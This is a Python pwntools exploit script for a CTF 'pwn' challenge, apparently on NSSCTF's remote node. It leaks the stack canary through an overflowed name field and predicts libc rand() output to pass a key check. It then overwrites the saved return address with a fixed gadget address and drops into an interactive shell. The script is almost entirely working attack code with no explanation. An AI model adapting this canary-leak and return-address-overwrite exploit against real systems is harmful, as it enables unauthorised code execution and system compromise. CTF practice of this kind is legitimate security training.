from pwn import *
import sys
remote_addr = ["node5.anna.nssctf.cn",28613]
from ctypes import *
#libc = ELF('')
#elf = ELF('')
if len(sys.argv) == 1:
    context.log_level="debug" 
    #p = process(["qemu-aarch64", "-L", "/usr/aarch64-linux-gnu/", "-g","1234","./stack"]) 
    #p = process(["qemu-aarch64", "-L", ".", "./stack"]) 
    p = process("./pwn")
    context(arch='amd64', os='linux')
    context.terminal = ['tmux', 'splitw', '-h']
if len(sys.argv) == 2 :
    if 'r' in sys.argv[1]:
        p = remote(remote_addr[0],remote_addr[1])
    if 'n' not in sys.argv[1]:
        context.log_level="debug" 
        #context(arch = 'amd64', os = 'linux')
r = lambda : p.recv()
rl = lambda : p.recvline()
rc = lambda x: p.recv(x)
ru = lambda x: p.recvuntil(x)
rud = lambda x: p.recvuntil(x, drop=True)
s = lambda x: p.send(x)
sl = lambda x: p.sendline(x)
sa = lambda x, y: p.sendafter(x, y)
sla = lambda x, y: p.sendlineafter(x, y)
shell = lambda : p.interactive()
pr = lambda name,x : log.info(name+':'+hex(x))

DEBUG = 0

def debug(bp = None):
    if DEBUG == 1:
        if bp != None:
            gdb.attach(p, bp)
        else:
            gdb.attach(p)

debug()

sj = cdll.LoadLibrary('/usr/lib/x86_64-linux-gnu/libc.so.6')
payload = b'\xc7\x07\x40'
payload = payload.ljust(0x28, b'c')
sa(b'name\n\n', payload + b'b')
ru(b'b')
canary = u64(rc(7).ljust(8, b'\x00')) << 8
pr('canary', canary)
sa(b'key\n\n', p32(sj.rand() % 1000 + 324))
sa(b'wish to me\n', p64(0x4007c7) + p64(0x4007c7) * 10 + p64(canary) + b'a' * 4)

shell()
